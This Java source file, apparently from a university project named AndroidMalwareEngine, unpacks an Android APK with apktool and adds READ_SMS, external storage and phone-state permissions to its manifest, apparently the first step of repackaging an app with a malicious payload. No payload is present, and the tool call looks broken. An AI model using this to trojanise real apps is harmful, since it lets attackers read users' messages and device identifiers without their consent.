package it.unisannio.srss.ame;

import it.unisannio.srss.ame.payloads.common.Utils;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.TransformerException;

import org.xml.sax.SAXException;

// "/home/danilo/git/androidmalwareengine/AndroidMalwareEngine/tools/HelloWorld/AndroidManifest.xml"
// "/home/ermanno/git/androidmalwareengine/AndroidMalwareEngine/tools/HelloWord//AndroidManifest.xml"
public class AndroidMalwareEngine {

	public final static String APKTOOL = "tools/apktool";

	public static void main(String[] args) throws ParserConfigurationException,
			SAXException, IOException, TransformerException {

		String apk = args[0];
		File apkFile = null;
		if (apk == null || !(apkFile = new File(apk)).canRead()) {
			System.err.println("APK not found!");
			System.exit(1);
			return;
		}

		File tmpDir = Files.createTempDirectory("srss").toFile();
		// tmpDir.deleteOnExit();
		System.out.println(tmpDir.getAbsolutePath());
		Runtime.getRuntime().exec(
				APKTOOL + " ./apktool d -o " + tmpDir.getAbsolutePath()
						+ " -f " + apk);
		List<String> perms = new ArrayList<String>();
		perms.add("android.permission.READ_SMS");
		perms.add("android.permission.WRITE_EXTERNAL_STORAGE");
		perms.add("android.permission.READ_PHONE_STATE");
		//Non trova il file!
		String manifest = tmpDir.getAbsolutePath() + "//AndroidManifest.xml";
	
		Utils.updateManifest(new File(manifest), perms);
	}
}
